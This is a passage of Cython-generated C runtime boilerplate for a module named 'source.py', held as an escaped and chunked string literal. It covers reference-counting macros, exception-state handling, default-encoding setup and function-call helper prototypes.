__Pyx_PySequence_Tuple(obj)\\\\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_\"\"t(size_t);\\nstatic CYTHON_INLINE Py_ha""sh_t __Pyx_PyIndex_AsHash_t(PyObject*);\\n#if CYTHON_ASSUME_SAFE_MACROS\\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\\n#else\\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\\n#endif\\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\\n#if PY_MAJOR_VERSION >= 3\\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\\n#else\\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\\n#endif\\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\\n    PyObject* sys;\\n    PyObject* default_encoding = NULL;\\n    PyObject* ascii_chars_u = NULL;\\n    PyObject* ascii_chars_b = NULL;\\n    const char* default_encoding_c;\\n    sys = PyImport_ImportModule(\\\"sys\\\");\\n    if (!sys) goto bad;\\n    default_encoding = PyObject_CallMethod(sys, (char*) \\\"getdefaultencoding\\\", NULL);\\n    Py_DECREF(sys);\\n    if (!default_encoding) goto bad;\\n    default_encoding_c = PyBytes_AsString(default_encoding);\\n    if (!default_encoding_c) goto bad;\\n    if (strcmp(default_encoding_c, \\\"ascii\\\") == 0) {\\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\\n    } else {\\n        char ascii_chars[128];\\n        int c;\\n        for (c = 0; c < 128; c++) {\\n            ascii_chars[c] = c;\\n        }\\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\\n        if (!ascii_chars_u) goto bad;\\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\\n      ""      PyErr_For\"\"mat(\\n                PyExc_ValueError,\\n                \\\"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\\\",\\n                default_encoding_c);\\n            goto bad;\\n        }\\n        Py_DECREF(ascii_chars_u);\\n        Py_DECREF(ascii_chars_b);\\n    }\\n    Py_DECREF(default_encoding);\\n    return 0;\\nbad:\\n    Py_XDECREF(default_encoding);\\n    Py_XDECREF(ascii_chars_u);\\n    Py_XDECREF(ascii_chars_b);\\n    return -1;\\n}\\n#endif\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\\n#else\\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\\n    PyObject* sys;\\n    PyObject* default_encoding = NULL;\\n    char* default_encoding_c;\\n    sys = PyImport_ImportModule(\\\"sys\\\");\\n    if (!sys) goto bad;\\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \\\"getdefaultencoding\\\", NULL);\\n    Py_DECREF(sys);\\n    if (!default_encoding) goto bad;\\n    default_encoding_c = PyBytes_AsString(default_encoding);\\n    if (!default_encoding_c) goto bad;\\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\\n    Py_DECREF(default_encoding);\\n    return 0;\\nbad:\\n    Py_XDECREF(default_encoding);\\n    return -1;\\n}\\n#endif\\n#endif\\n\\n\\n/* Test for GCC > 2.95 */\\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\\n  #define likely(x)   __builtin_expect(!!(x), 1)\\n  #define unlikely(x) __builtin_expect(!!(x), 0)""\\n#else /* !__GNUC__ or GCC < 2.95 */\\n  #define likely(x)   (x)\\n  #define unlikely\"\"(x) (x)\\n#endif /* __GNUC__ */\\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\\n\\nstatic PyObject *__pyx_m = NULL;\\nstatic PyObject *__pyx_d;\\nstatic PyObject *__pyx_b;\\nstatic PyObject *__pyx_cython_runtime = NULL;\\nstatic PyObject *__pyx_empty_tuple;\\nstatic PyObject *__pyx_empty_bytes;\\nstatic PyObject *__pyx_empty_unicode;\\nstatic int __pyx_lineno;\\nstatic int __pyx_clineno = 0;\\nstatic const char * __pyx_cfilenm= __FILE__;\\nstatic const char *__pyx_filename;\\n\\n\\nstatic const char *__pyx_f[] = {\\n  \\\"source.py\\\",\\n};\\n\\n/*--- Type declarations ---*/\\n\\n/* --- Runtime support code (head) --- */\\n/* Refnanny.proto */\\n#ifndef CYTHON_REFNANNY\\n  #define CYTHON_REFNANNY 0\\n#endif\\n#if CYTHON_REFNANNY\\n  typedef struct {\\n    void (*INCREF)(void*, PyObject*, int);\\n    void (*DECREF)(void*, PyObject*, int);\\n    void (*GOTREF)(void*, PyObject*, int);\\n    void (*GIVEREF)(void*, PyObject*, int);\\n    void* (*SetupContext)(const char*, int, const char*);\\n    void (*FinishContext)(void**);\\n  } __Pyx_RefNannyAPIStruct;\\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\\n#ifdef WITH_THREAD\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\\\n          if (acquire_gil) {\\\\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\\\\n              PyGILState_Release(__pyx_gilstate_save);\\\\\\n          } else {\\\\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\\\\n          }\\n#else\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\\\n          __pyx_refnanny = __Pyx_R""efNanny->SetupContext((name), __LINE__, __FILE__)\\n#endif\\n  #define __Pyx_RefNannyFinishContext()\\\\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\"\"\\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)\\n#else\\n  #define __Pyx_RefNannyDeclarations\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\n  #define __Pyx_RefNannyFinishContext()\\n  #define __Pyx_INCREF(r) Py_INCREF(r)\\n  #define __Pyx_DECREF(r) Py_DECREF(r)\\n  #define __Pyx_GOTREF(r)\\n  #define __Pyx_GIVEREF(r)\\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\\n  #define __Pyx_XGOTREF(r)\\n  #define __Pyx_XGIVEREF(r)\\n#endif\\n#define __Pyx_XDECREF_SET(r, v) do {\\\\\\n        PyObject *tmp = (PyObject *) r;\\\\\\n        r = v; __Pyx_XDECREF(tmp);\\\\\\n    } while (0)\\n#define __Pyx_DECREF_SET(r, v) do {\\\\\\n        PyObject *tmp = (PyObject *) r;\\\\\\n        r = v; __Pyx_DECREF(tmp);\\\\\\n    } while (0)\\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\\n\\n/* PyObjectGetAttrStr.proto */\\n#if CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);""\\n#else\\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\\n#endif\\n\\n/* GetBuiltinName.proto */\\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\\n\\n/* Import.proto */\\nstatic PyObject *__Pyx_Import(P\"\"yObject *name, PyObject *from_list, int level);\\n\\n/* decode_c_string_utf16.proto */\\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16(const char *s, Py_ssize_t size, const char *errors) {\\n    int byteorder = 0;\\n    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);\\n}\\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16LE(const char *s, Py_ssize_t size, const char *errors) {\\n    int byteorder = -1;\\n    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);\\n}\\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16BE(const char *s, Py_ssize_t size, const char *errors) {\\n    int byteorder = 1;\\n    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);\\n}\\n\\n/* decode_c_bytes.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(\\n         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,\\n         const char* encoding, const char* errors,\\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors));\\n\\n/* decode_bytes.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_decode_bytes(\\n         PyObject* string, Py_ssize_t start, Py_ssize_t stop,\\n         const char* encoding, const char* errors,\\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {\\n    return __Pyx_decode_c_bytes(\\n        PyBytes_AS_STRING(string), PyBytes_GET_SIZE(string),\\n        start, stop, encoding, errors, decode_func);\\n}\\n\\n/* PyCFunctionFastCall.proto */\\n#if CYTHON_FAST_PYCCALL\\nstatic CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);\\n#else\\n#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)\\n#endif\\n\\n/* PyFunctionF""astCall.proto */\\n#if CYTHON_FAST_PYCALL\\n#define __Pyx_PyFunction_FastCall(func, args, nargs)\\\\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\\n#if 1 || PY_VERSION_HEX < 0x030600B1\\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObj\"\"ect **args, Py_ssize_t nargs, PyObject *kwargs);\\n#else\\n#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)\\n#endif\\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\\n#ifndef Py_MEMBER_SIZE\\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\\n#endif\\n#if CYTHON_FAST_PYCALL\\n  static size_t __pyx_pyframe_localsplus_offset = 0;\\n  #include \\\"frameobject.h\\\"\\n#if PY_VERSION_HEX >= 0x030b00a6\\n  #ifndef Py_BUILD_CORE\\n    #define Py_BUILD_CORE 1\\n  #endif\\n  #include \\\"internal/pycore_frame.h\\\"\\n#endif\\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))\\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\\n#endif // CYTHON_FAST_PYCALL\\n#endif\\n\\n/* PyObjectCall.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\\n#else\\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\\n#endif\\n\\n/* PyObjectCallMethO.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\\n#endif\\n\\n/* PyObjectCallOneArg.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, Py""Object *arg);\\n\\n/* FetchCommonType.proto */\\nstatic PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);\\n\\n/* CythonFunctionShared.proto */\\n#define __Pyx_CyFunction_USED 1\\n#define __Pyx_CYFUNCTION_STATICMETHOD  0x01\\n#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02\\n#define __Pyx_CYFUNCTION_CCLASS        0x04\\n#define __Pyx_CyFunct\"\"ion_GetClosure(f)\\\\\\n    (((__pyx_CyFunctionObject *) (f))->func_closure)\\n#define __Pyx_CyFunction_GetClassObj(f)\\\\\\n    (((__pyx_CyFunctionObject *) (f))->func_classobj)\\n#define __Pyx_CyFunction_Defaults(type, f)\\\\\\n    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))\\n#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\\\\\\n    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)\\ntypedef struct {\\n    PyCFunctionObject func;\\n#if PY_VERSION_HEX < 0x030500A0\\n    PyObject *func_weakreflist;\\n#endif\\n    PyObject *func_dict;\\n    PyObject *func_name;\\n    PyObject *func_qualname;\\n    PyObject *func_doc;\\n    PyObject *func_globals;\\n    PyObject *func_code;\\n    PyObject *func_closure;\\n    PyObject *func_classobj;\\n    void *defaults;\\n    int defaults_pyobjects;\\n    size_t defaults_size;  // used by FusedFunction for copying defaults\\n    int flags;\\n    PyObject *defaults_tuple;\\n    PyObject *defaults_kwdict;\\n    PyObject *(*defaults_getter)(PyObject *);\\n    PyObject *func_annotations;\\n} __pyx_CyFunctionObject;\\nstatic PyTypeObject *__pyx_CyFunctionType = 0;\\n#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))\\nstatic PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,\\n                                      int flags, PyObject* qualname,\\n                                      PyObject *self,\\n                                      PyObject *module, PyObject *globals,\\n                                      PyObject* code);\\nstatic CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,\\n                ""                                         size_t size,\\n                                                         int pyobjects);\\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,\\n                                                            PyObject *tuple);\\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,\\n                                       \"\"                      PyObject *dict);\\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,\\n                                                              PyObject *dict);\\nstatic int __pyx_CyFunction_init(void);\\n\\n/* CythonFunction.proto */\\nstatic PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,\\n                                      int flags, PyObject* qualname,\\n                                      PyObject *closure,\\n                                      PyObject *module, PyObject *globals,\\n                                      PyObject* code);\\n\\n/* PyObjectCallNoArg.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);\\n#else\\n#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)\\n#endif\\n\\n/* PyDictVersioning.proto */\\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\\\\n    (cache_var) = (value);\\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\\\\n        (VAR) = __pyx_dict_cached_value;\\\\\\n    } else {\\\\\\n        (VAR) = __pyx_dict_cached_value ""= (LOOKUP);\\\\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\\\\n    }\\\\\\n}\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\\n#else\\n#define __PYX_GET_DICT_VERSION(dict)  (0)\\n#define __PYX_UPDATE_DI\"\"CT_CACHE(dict, value, cache_var, version_var)\\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\\n#endif\\n\\n/* GetModuleGlobalName.proto */\\n#if CYTHON_USE_DICT_VERSIONS\\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\\\\n} while(0)\\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\\\\n    PY_UINT64_T __pyx_dict_version;\\\\\\n    PyObject *__pyx_dict_cached_value;\\\\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\\\\n} while(0)\\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\\n#else\\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\\n#endif\\n\\n/* PyObjectLookupSpecial.proto */\\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject""* attr_name) {\\n    PyObject *res;\\n    PyTypeObject *tp = Py_TYPE(obj);\\n#if PY_MAJOR_VERSION < 3\\n    if (unlikely(PyInstance_Check(obj)))\\n        return __Pyx_PyObject_GetAttrStr(obj, attr_name);\\n#endif\\n    res = _PyType_Lookup(tp, attr_name);\\n    if (likely(res)) {\\n        descrgetfunc f = Py_TYPE(res)->tp_descr_get;\\n        if (!f) {\\n            Py_INCREF(res);\\n        } else {\\n            res = f(res, obj, (PyObject *)tp);\\n        }\\n    } else {\\n        PyErr_SetObject(PyExc_AttributeError, attr_\"\"name);\\n    }\\n    return res;\\n}\\n#else\\n#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)\\n#endif\\n\\n/* GetTopmostException.proto */\\n#if CYTHON_USE_EXC_INFO_STACK\\nstatic _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);\\n#endif\\n\\n/* PyThreadStateGet.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\\n#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type\\n#else\\n#define __Pyx_PyThreadState_declare\\n#define __Pyx_PyThreadState_assign\\n#define __Pyx_PyErr_Occurred()  PyErr_Occurred()\\n#endif\\n\\n/* SaveResetException.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)\\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\\n#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)\\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\\n#else\\n#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)\\n#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)\\n#endif\\n\\n/* GetException.proto */\\n#if CYTHON_FAST_THREAD_S""TATE\\n#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)\\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\\n#else\\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);\\n#endif\\n\\n/* PyErrFetchRestore.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\\n#define __Pyx_ErrFetchWithS\"\"tate(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\\n#if CYTHON_COMPILING_IN_CPYTHON\\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\\n#else\\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\\n#endif\\n#else\\n#define __Pyx_PyErr_Clear() PyErr_Clear()\\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\\n#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)\\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\\n#endif\\n\\n/* SliceObject.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Ge""tSlice(\\n        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,\\n        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,\\n        int has_cstart, int has_cstop, int wraparound);\\n\\n/* PyErrExceptionMatches.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)\\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);\\n#else\\n#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)\\n#endif\\n\\n/* PyObjectSetAttrStr.proto */\\n#if CYTHON_USE_TYPE_SLOTS\"\"\\n#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)\\nstatic CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);\\n#else\\n#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)\\n#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)\\n#endif\\n\\n/* SwapException.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)\\nstatic CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\\n#else\\nstatic CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);\\n#endif\\n\\n/* CLineInTraceback.proto */\\n#ifdef CYTHON_CLINE_IN_TRACEBACK\\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\\n#else\\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\\n#endif\\n\\n/* CodeObjectCache.proto */\\ntypedef struct {\\n    PyCodeObject* code_object;\\n    int code_line;\\n} __Pyx_CodeObjectCacheEntry;\\nstruct __Pyx_CodeObjectCache {\\n    int count;\\n    int max_count;\\n    __Pyx_CodeObjectCacheEntry* entries;\\n};\\nstatic struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};\\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjec""tCacheEntry* entries, int count, int code_line);\\nstatic PyCodeObject *__pyx_find_code_object(int code_line);\\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);\\n\\n/* AddTraceback.proto */\\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\\n                               int py_line, const char *filename);\\n\\n/* GCCDiagnostics.proto */\\n#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\\n#define __Pyx_HAS_GCC_DIAGNOSTIC\\n#endif\\n\\n/* CIntToPy.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);\\n\\n/* CIntFromPy.proto */\\nstatic CYTHON_INLINE long __Pyx_PyIn\"\"t_As_long(PyObject *);\\n\\n/* CIntFromPy.proto */\\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);\\n\\n/* FastTypeChecks.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\\n#else\\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\\n#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))\\n#endif\\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\\n\\n/* CheckBinaryVersion.proto */\\nstatic int 